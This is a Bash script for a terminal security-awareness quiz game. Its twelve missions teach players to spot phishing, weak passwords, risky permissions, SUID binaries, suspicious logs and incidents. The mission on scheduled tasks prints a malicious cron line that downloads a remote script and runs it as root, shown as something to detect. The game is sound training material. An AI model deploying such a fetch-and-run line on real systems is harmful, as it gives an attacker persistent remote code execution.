#!/usr/bin/env bash
# ============================================================
#  TERMINAL ZERO — An EV Cyber Academy CTF Experience
#  A pure-Bash, terminal-based cybersecurity decision game.
#  Run:  chmod +x game.sh && ./game.sh
# ============================================================

set -uo pipefail

# ---------- Paths ----------
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SAVE_DIR="$SCRIPT_DIR/saves"
SAVE_FILE="$SAVE_DIR/progress.dat"

mkdir -p "$SAVE_DIR"

# ---------- Colors ----------
if [[ -t 1 ]] && command -v tput >/dev/null 2>&1 && [[ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]]; then
    C_RESET="$(tput sgr0)"
    C_BOLD="$(tput bold)"
    C_GREEN="$(tput setaf 2)"
    C_RED="$(tput setaf 1)"
    C_YELLOW="$(tput setaf 3)"
    C_CYAN="$(tput setaf 6)"
    C_MAGENTA="$(tput setaf 5)"
    C_BLUE="$(tput setaf 4)"
    C_GRAY="$(tput setaf 7)"
else
    C_RESET=""; C_BOLD=""; C_GREEN=""; C_RED=""; C_YELLOW=""
    C_CYAN=""; C_MAGENTA=""; C_BLUE=""; C_GRAY=""
fi

# ---------- State ----------
XP=0
POINTS=0
COMPLETED=""          # comma-separated mission numbers, e.g. ",1,2,3,"
TOTAL_MISSIONS=12

# ============================================================
#  UTILITY FUNCTIONS
# ============================================================

type_effect() {
    # Slow "typing" print. Usage: type_effect "text" [delay]
    local text="$1"
    local delay="${2:-0.012}"
    local i char
    for (( i=0; i<${#text}; i++ )); do
        char="${text:$i:1}"
        printf '%s' "$char"
        sleep "$delay"
    done
    printf '\n'
}

pause() {
    echo
    read -rp "$(printf '%s' "${C_GRAY}Press ENTER to continue...${C_RESET}")" _
}

divider() {
    printf '%s\n' "${C_GRAY}────────────────────────────────────────────────────────${C_RESET}"
}

banner() {
    clear
    printf '%s\n' "${C_CYAN}${C_BOLD}"
    cat <<'EOF'
 _____ _____ ____  __  __ ___ _   _    _    _
|_   _| ____|  _ \|  \/  |_ _| \ | |  / \  | |
  | | |  _| | |_) | |\/| || ||  \| | / _ \ | |
  | | | |___|  _ <| |  | || || |\  |/ ___ \| |___
  |_| |_____|_| \_\_|  |_|___|_| \_/_/   \_\_____|

        _____ _____ ____   ___
       |__  /| ____|  _ \ / _ \
         / / |  _| | |_) | | | |
        / /_ | |___|  _ <| |_| |
       /____||_____|_| \_\\___/
EOF
    printf '%s\n' "${C_RESET}"
    printf '%s\n' "${C_MAGENTA}${C_BOLD}          EV CYBER ACADEMY — TRAINING RANGE${C_RESET}"
    divider
}

# ---------- Rank calculation ----------
get_rank() {
    local xp="$1"
    if   (( xp < 100 )); then echo "Recruit"
    elif (( xp < 250 )); then echo "Operative"
    elif (( xp < 450 )); then echo "Specialist"
    elif (( xp < 700 )); then echo "Elite"
    else echo "Certified"
    fi
}

is_completed() {
    local m="$1"
    [[ "$COMPLETED" == *",$m,"* ]]
}

mark_completed() {
    local m="$1"
    if ! is_completed "$m"; then
        COMPLETED="${COMPLETED}${m},"
    fi
}

count_completed() {
    if [[ -z "$COMPLETED" || "$COMPLETED" == "," ]]; then
        echo 0
    else
        echo "$COMPLETED" | tr ',' '\n' | grep -c '[0-9]'
    fi
}

# ---------- Save / Load ----------
load_save() {
    if [[ -f "$SAVE_FILE" ]]; then
        # shellcheck disable=SC1090
        source "$SAVE_FILE"
    else
        XP=0
        POINTS=0
        COMPLETED=","
    fi
}

save_progress() {
    cat > "$SAVE_FILE" <<EOF
XP=$XP
POINTS=$POINTS
COMPLETED="$COMPLETED"
EOF
}

reset_progress() {
    echo
    read -rp "${C_RED}Are you sure you want to wipe all progress? (y/N): ${C_RESET}" confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
        XP=0
        POINTS=0
        COMPLETED=","
        save_progress
        echo "${C_GREEN}Progress reset.${C_RESET}"
    else
        echo "Cancelled."
    fi
    pause
}

# ============================================================
#  MISSION DATABASE
#  Each mission sets these globals when loaded:
#    M_TITLE M_BELT M_SCENARIO M_OPT[1..4] M_CORRECT M_EXPLAIN M_HINT M_XP
# ============================================================

load_mission() {
    local n="$1"
    case "$n" in
    1)
        M_TITLE="Suspicious Sender"
        M_BELT="Recruit"
        M_XP=30
        M_SCENARIO="You open your inbox and see an email from:
  ${C_YELLOW}'IT-Support@ev-cyberacaderny.com'${C_RESET}
Subject: 'URGENT: Your password expires in 1 hour — click to verify.'

The domain looks almost right, but something feels off."
        M_OPT1="Click the link immediately, it's urgent"
        M_OPT2="Reply with your current password to confirm identity"
        M_OPT3="Ignore it and report it as phishing to IT"
        M_OPT4="Forward it to five coworkers to warn them"
        M_CORRECT=3
        M_HINT="Look very closely at the domain name spelling."
        M_EXPLAIN="The domain 'ev-cyberacaderny.com' is a lookalike (typosquat) of the real domain. Legitimate IT never asks for passwords by email. The right move is to report it, never click or reply."
        ;;
    2)
        M_TITLE="Weak Foundations"
        M_BELT="Recruit"
        M_XP=30
        M_SCENARIO="You're reviewing a new employee's account setup.
Their password is: ${C_YELLOW}'Password123'${C_RESET}

It technically passes the system's 'must contain a number and
uppercase letter' rule."
        M_OPT1="Approve it — it meets the technical requirements"
        M_OPT2="Reject it — it's a common, easily guessed pattern"
        M_OPT3="Approve it but tell them to change it in 90 days"
        M_OPT4="Add one more number to the end and approve"
        M_CORRECT=2
        M_HINT="Think about how password-cracking dictionaries work — common patterns are the first thing they try."
        M_EXPLAIN="'Password123' technically satisfies complexity rules but is one of the most common passwords in every breach dictionary. Meeting the rule isn't the same as being secure — it should be rejected."
        ;;
    3)
        M_TITLE="Open Door"
        M_BELT="Recruit"
        M_XP=35
        M_SCENARIO="You run a permission check on a sensitive file:

  ${C_YELLOW}-rwxrwxrwx  1 root  root  4096  payroll_data.csv${C_RESET}

This file contains employee salary information."
        M_OPT1="Leave it — root owns it, so it's protected"
        M_OPT2="This is a serious risk — anyone can read, write, or execute it"
        M_OPT3="Only worry about it if the server is internet-facing"
        M_OPT4="It's fine as long as no one knows the file exists"
        M_CORRECT=2
        M_HINT="Read the permission string carefully: who can read/write it?"
        M_EXPLAIN="'rwxrwxrwx' (777) means owner, group, AND everyone else can read, write, and execute this file — regardless of who owns it. Sensitive data should be locked down (e.g. 600 or 640), not world-writable."
        ;;
    4)
        M_TITLE="The Link in the Chat"
        M_BELT="Operative"
        M_XP=40
        M_SCENARIO="A coworker's account messages you on Slack:

  ${C_YELLOW}'hey check this out lol -> bit.ly/4kXpQz9'${C_RESET}

It's 2 AM and this coworker never messages you this late."
        M_OPT1="Click it — it's just Slack, nothing bad can happen"
        M_OPT2="Ask the coworker directly (via another channel) if they sent it"
        M_OPT3="Reply 'lol nice' and move on"
        M_OPT4="Click it from your phone instead of your laptop, safer that way"
        M_CORRECT=2
        M_HINT="Odd timing + shortened link + out-of-character behavior = verify before you act."
        M_EXPLAIN="Compromised accounts often send unexpected links at odd hours. The safest move is out-of-band verification — contact the person through a different channel (phone, in person) before touching the link."
        ;;
    5)
        M_TITLE="The Login Storm"
        M_BELT="Operative"
        M_XP=40
        M_SCENARIO="[SYSTEM LOG]
Failed login: user=admin  IP=185.23.11.4  attempts=47  window=3min
Failed login: user=root   IP=185.23.11.4  attempts=12  window=3min"
        M_OPT1="Ignore it, failed logins happen all the time"
        M_OPT2="Block the IP, then check if it hit other accounts too"
        M_OPT3="Immediately delete the admin account"
        M_OPT4="Reset your own password only"
        M_CORRECT=2
        M_HINT="One action alone isn't enough — think contain AND investigate."
        M_EXPLAIN="47 failed attempts in 3 minutes across two privileged accounts is a classic brute-force pattern. The right response combines containment (block the IP) with investigation (check for a wider pattern), not just one or the other."
        ;;
    6)
        M_TITLE="The Attachment"
        M_BELT="Operative"
        M_XP=40
        M_SCENARIO="An invoice email arrives with an attachment:

  ${C_YELLOW}'Invoice_2024_FINAL.pdf.exe'${C_RESET}

The sender claims to be a vendor you've worked with before."
        M_OPT1="Open it, PDFs are always safe"
        M_OPT2="Rename the file to remove '.exe' and then open it"
        M_OPT3="Do not open it — the double extension is a red flag; verify with the vendor separately"
        M_OPT4="Forward it to a personal email to open it safely"
        M_CORRECT=3
        M_HINT="Look at the full file name, not just the icon."
        M_EXPLAIN="'.pdf.exe' is a classic disguise — Windows may hide the real '.exe' extension, tricking users into running an executable while thinking they're opening a PDF. Never run it; verify with the vendor through a known contact method."
        ;;
    7)
        M_TITLE="The SUID Surprise"
        M_BELT="Specialist"
        M_XP=50
        M_SCENARIO="A permission audit turns up this binary:

  ${C_YELLOW}-rwsr-xr-x  1 root  root  /usr/local/bin/backup_tool${C_RESET}

The 's' in the owner permission field stands out. This tool
was installed by a contractor six months ago and nobody
remembers reviewing it since."
        M_OPT1="Ignore it, SUID binaries are always safe if root owns them"
        M_OPT2="It runs with root privileges regardless of who executes it — investigate and audit it"
        M_OPT3="Delete it immediately without checking what depends on it"
        M_OPT4="Rename the file so it can't be executed"
        M_CORRECT=2
        M_HINT="The SUID bit changes WHO a program runs as — not just who can run it."
        M_EXPLAIN="The SUID bit ('s' instead of 'x') means the binary always executes with the owner's (root's) privileges, no matter which user runs it. Unreviewed SUID binaries are a classic privilege-escalation path and need auditing, not blind trust or reckless deletion."
        ;;
    8)
        M_TITLE="The Midnight Cron"
        M_BELT="Specialist"
        M_XP=50
        M_SCENARIO="You inspect a server's scheduled tasks:

  ${C_YELLOW}* * * * *  root  curl -s http://185.23.11.4/x.sh | bash${C_RESET}

This entry runs every single minute and nobody on the team
recognizes adding it."
        M_OPT1="Leave it, cron jobs are a normal part of Linux"
        M_OPT2="This is almost certainly malicious persistence — remove it and investigate the source"
        M_OPT3="Change it to run once a day instead"
        M_OPT4="Block outbound curl on the whole server permanently"
        M_CORRECT=2
        M_HINT="Piping a downloaded script straight into bash, every minute, as root — what does that let an attacker do?"
        M_EXPLAIN="This is a textbook persistence mechanism: every minute, as root, the server fetches and executes a remote script. That gives an attacker continuous remote code execution. It should be removed immediately and the incident investigated (how did it get there, what else changed)."
        ;;
    9)
        M_TITLE="Reading Between the Log Lines"
        M_BELT="Specialist"
        M_XP=50
        M_SCENARIO="[AUTH LOG EXCERPT]
02:14:01  Accepted password for backup_svc from 10.0.0.15
02:14:03  backup_svc: sudo su - root  (SUCCESS)
02:14:05  root: useradd -m svc_helper
02:14:06  root: usermod -aG sudo svc_helper

A service account just created a brand-new sudo user in
under 5 seconds after logging in."
        M_OPT1="Normal automation behavior, no action needed"
        M_OPT2="This is suspicious — a service account creating a privileged human-style account is a red flag worth escalating"
        M_OPT3="Only worry if svc_helper logs in from outside the network"
        M_OPT4="Just delete svc_helper and consider it resolved"
        M_CORRECT=2
        M_HINT="Ask: why would an automated service account need to create a NEW sudo user for itself?"
        M_EXPLAIN="Service accounts don't normally create new administrative users — this pattern strongly suggests the backup_svc account was compromised and used to plant a backdoor account. It needs to be escalated and investigated, not just quietly cleaned up."
        ;;
    10)
        M_TITLE="The Chain: Part One"
        M_BELT="Elite"
        M_XP=65
        M_SCENARIO="During an audit you find a world-readable config file
containing a database connection string with embedded
credentials:

  ${C_YELLOW}DB_CONN=postgres://svc_app:Pr0dPass!2024@10.0.4.12/prod${C_RESET}

This file has been sitting in a shared project folder for
over a year, readable by every employee."
        M_OPT1="Low priority — it's just a database password"
        M_OPT2="High priority — rotate the credential, restrict file access, and check for unauthorized access using it"
        M_OPT3="Delete the file only, no need to change the password"
        M_OPT4="Encrypt the file but keep the same password"
        M_CORRECT=2
        M_HINT="A leaked credential is only 'fixed' once it no longer works AND you've checked if it was already used."
        M_EXPLAIN="A long-exposed, plaintext production database credential is a serious finding. Encrypting or deleting the file doesn't help if the password itself is already compromised — it must be rotated, access restricted, and logs checked for prior misuse."
        ;;
    11)
        M_TITLE="The Chain: Part Two"
        M_BELT="Elite"
        M_XP=65
        M_SCENARIO="Following up on the leaked database credential, you find
this in the production database access log:

  10.0.4.12  svc_app  SELECT * FROM employees  02:41 AM
  10.0.4.12  svc_app  SELECT * FROM admin_users 02:42 AM
  203.0.113.9 svc_app  SELECT * FROM admin_users 02:43 AM  <-- external IP

The same account queried sensitive tables from an external
IP address one minute after an internal query."
        M_OPT1="Coincidence — the service account probably has multiple servers"
        M_OPT2="This strongly suggests the leaked credential was actively used by an outsider — treat this as an active incident"
        M_OPT3="Just block 203.0.113.9 and consider the matter closed"
        M_OPT4="Wait a week to see if it happens again before acting"
        M_CORRECT=2
        M_HINT="Combine what you learned in Part One (leaked credential) with what you're seeing now (external use of that same account)."
        M_EXPLAIN="This connects directly to the leaked credential from Part One — the same account being used from an unexpected external IP, right after internal use, is strong evidence of active credential abuse. This should be escalated as a live incident: rotate credentials, revoke sessions, and investigate scope, not just block one IP and move on."
        ;;
    12)
        M_TITLE="Incident Command"
        M_BELT="Elite"
        M_XP=70
        M_SCENARIO="You're the on-call lead. In the last 10 minutes:
  - A brute-force alert fired on the VPN gateway
  - A SUID binary was modified on a production server
  - A backup service account created a new sudo user
  - A customer database was queried from an unrecognized IP

You can only take ONE immediate first action before your
team assembles. What do you do first?"
        M_OPT1="Immediately shut down every server to stop all activity"
        M_OPT2="Isolate/contain the most critical affected system while preserving logs, then coordinate the full response with your team"
        M_OPT3="Start with the VPN alert only since it came in first"
        M_OPT4="Wait for management approval before touching anything"
        M_CORRECT=2
        M_HINT="Incident response priorities: contain damage without destroying evidence, then coordinate — not panic, not paralysis."
        M_EXPLAIN="Good incident response contains the most critical exposure quickly (here, likely the database/credential compromise) while preserving logs for investigation, then brings in the team for a coordinated response. Shutting everything down destroys evidence and causes unnecessary outage; waiting for approval on an active incident risks further damage; chronological order isn't the same as severity order."
        ;;
    *)
        M_TITLE=""
        ;;
    esac
}

# ============================================================
#  MISSION RUNNER
# ============================================================

run_mission() {
    local n="$1"
    load_mission "$n"

    if [[ -z "$M_TITLE" ]]; then
        echo "${C_RED}Invalid mission.${C_RESET}"
        pause
        return
    fi

    clear
    printf '%s\n' "${C_MAGENTA}${C_BOLD}═══ MISSION $n — [$M_BELT BELT] ═══${C_RESET}"
    printf '%s\n' "${C_CYAN}${C_BOLD}$M_TITLE${C_RESET}"
    divider
    echo
    type_effect "$M_SCENARIO" 0.006
    echo
    divider
    echo "${C_BOLD}What would you do?${C_RESET}"
    echo
    echo "  ${C_YELLOW}1)${C_RESET} $M_OPT1"
    echo "  ${C_YELLOW}2)${C_RESET} $M_OPT2"
    echo "  ${C_YELLOW}3)${C_RESET} $M_OPT3"
    echo "  ${C_YELLOW}4)${C_RESET} $M_OPT4"
    echo
    echo "  ${C_GRAY}h) Use a hint (costs 10 points)   q) Quit to menu${C_RESET}"
    echo

    local choice
    while true; do
        read -rp "Your choice: " choice
        case "$choice" in
            h|H)
                if (( POINTS >= 10 )); then
                    POINTS=$((POINTS - 10))
                    echo
                    echo "${C_BLUE}HINT: $M_HINT${C_RESET}"
                    echo
                else
                    echo "${C_RED}Not enough points for a hint.${C_RESET}"
                fi
                ;;
            q|Q)
                return
                ;;
            1|2|3|4)
                break
                ;;
            *)
                echo "${C_RED}Please enter 1-4, h, or q.${C_RESET}"
                ;;
        esac
    done

    echo
    if [[ "$choice" == "$M_CORRECT" ]]; then
        echo "${C_GREEN}${C_BOLD}CORRECT.${C_RESET}"
        if is_completed "$n"; then
            echo "${C_GRAY}(Already completed — no additional XP awarded.)${C_RESET}"
        else
            XP=$((XP + M_XP))
            POINTS=$((POINTS + 15))
            mark_completed "$n"
            echo "${C_GREEN}+$M_XP XP   +15 points${C_RESET}"
        fi
    else
        echo "${C_RED}${C_BOLD}INCORRECT.${C_RESET}"
        echo "${C_GRAY}The correct answer was option $M_CORRECT.${C_RESET}"
    fi
    echo
    echo "${C_BOLD}Debrief:${C_RESET} $M_EXPLAIN"

    save_progress
    pause
}

# ============================================================
#  MENUS
# ============================================================

show_progress() {
    clear
    banner
    local rank done_count
    rank="$(get_rank "$XP")"
    done_count="$(count_completed)"
    echo "${C_BOLD}AGENT PROFILE${C_RESET}"
    divider
    printf "  Rank:            %s%s%s\n" "$C_CYAN" "$rank" "$C_RESET"
    printf "  XP:              %s%s%s\n" "$C_YELLOW" "$XP" "$C_RESET"
    printf "  Points:          %s%s%s\n" "$C_YELLOW" "$POINTS" "$C_RESET"
    printf "  Missions done:   %s%s / %s%s\n" "$C_GREEN" "$done_count" "$TOTAL_MISSIONS" "$C_RESET"
    echo
    divider
    echo "${C_BOLD}BELT STATUS${C_RESET}"
    print_belt_status "Recruit"    1 3
    print_belt_status "Operative"  4 6
    print_belt_status "Specialist" 7 9
    print_belt_status "Elite"      10 12
    pause
}

print_belt_status() {
    local belt="$1" start="$2" end="$3"
    local i mark line=""
    for (( i=start; i<=end; i++ )); do
        if is_completed "$i"; then
            mark="${C_GREEN}[X]${C_RESET}"
        else
            mark="${C_GRAY}[ ]${C_RESET}"
        fi
        line="$line $mark M$i"
    done
    printf "  %-11s %s\n" "$belt:" "$line"
}

mission_select_menu() {
    while true; do
        clear
        banner
        echo "${C_BOLD}MISSION SELECT${C_RESET}"
        divider
        local i status
        for (( i=1; i<=TOTAL_MISSIONS; i++ )); do
            load_mission "$i"
            if is_completed "$i"; then
                status="${C_GREEN}[DONE]${C_RESET}"
            else
                status="${C_YELLOW}[ NEW]${C_RESET}"
            fi
            printf "  %s %2d) [%s] %s\n" "$status" "$i" "$M_BELT" "$M_TITLE"
        done
        echo
        divider
        echo "  Enter a mission number to play, or 'b' to go back."
        echo
        read -rp "> " sel
        if [[ "$sel" == "b" || "$sel" == "B" ]]; then
            return
        elif [[ "$sel" =~ ^[0-9]+$ ]] && (( sel >= 1 && sel <= TOTAL_MISSIONS )); then
            run_mission "$sel"
        else
            echo "${C_RED}Invalid selection.${C_RESET}"
            sleep 1
        fi
    done
}

continue_game() {
    # Plays the next uncompleted mission in order, or opens mission select if all done.
    local i
    for (( i=1; i<=TOTAL_MISSIONS; i++ )); do
        if ! is_completed "$i"; then
            run_mission "$i"
            return
        fi
    done
    echo
    echo "${C_GREEN}All missions completed! Opening mission select for replay...${C_RESET}"
    sleep 2
    mission_select_menu
}

settings_menu() {
    clear
    banner
    echo "${C_BOLD}SETTINGS${C_RESET}"
    divider
    echo "  1) Reset all progress"
    echo "  2) Back to main menu"
    echo
    read -rp "> " sel
    case "$sel" in
        1) reset_progress ;;
        *) return ;;
    esac
}

intro_sequence() {
    clear
    banner
    type_effect "${C_GRAY}Connecting to EV Cyber Academy Training Range...${C_RESET}" 0.01
    sleep 0.3
    type_effect "${C_GRAY}Access granted.${C_RESET}" 0.01
    echo
    type_effect "Welcome, recruit. I'm your training instructor." 0.012
    type_effect "You'll face real-world security scenarios. No fake commands," 0.012
    type_effect "no simulators pretending to be a terminal — just you, the" 0.012
    type_effect "situation, and the decision you make." 0.012
    echo
    type_effect "Choose wisely. Some mistakes in this business only happen once." 0.012
    pause
}

main_menu() {
    while true; do
        clear
        banner
        local rank
        rank="$(get_rank "$XP")"
        printf "  ${C_BOLD}Rank:${C_RESET} %s   ${C_BOLD}XP:${C_RESET} %s   ${C_BOLD}Points:${C_RESET} %s   ${C_BOLD}Progress:${C_RESET} %s/%s\n" \
            "$rank" "$XP" "$POINTS" "$(count_completed)" "$TOTAL_MISSIONS"
        divider
        echo "  1) Continue"
        echo "  2) Mission Select"
        echo "  3) Agent Profile / Progress"
        echo "  4) Settings"
        echo "  5) Exit"
        echo
        read -rp "> " sel
        case "$sel" in
            1) continue_game ;;
            2) mission_select_menu ;;
            3) show_progress ;;
            4) settings_menu ;;
            5)
                echo
                echo "${C_CYAN}Logging off the Range. See you next session, recruit.${C_RESET}"
                exit 0
                ;;
            *)
                echo "${C_RED}Invalid selection.${C_RESET}"
                sleep 1
                ;;
        esac
    done
}

# ============================================================
#  ENTRY POINT
# ============================================================

main() {
    if (( BASH_VERSINFO[0] < 4 )); then
        echo "This game requires Bash 4 or higher."
        exit 1
    fi

    load_save
    local first_run=0
    [[ ! -f "$SAVE_FILE" ]] && first_run=1

    if (( first_run )); then
        intro_sequence
        save_progress
    fi

    main_menu
}

main "$@"
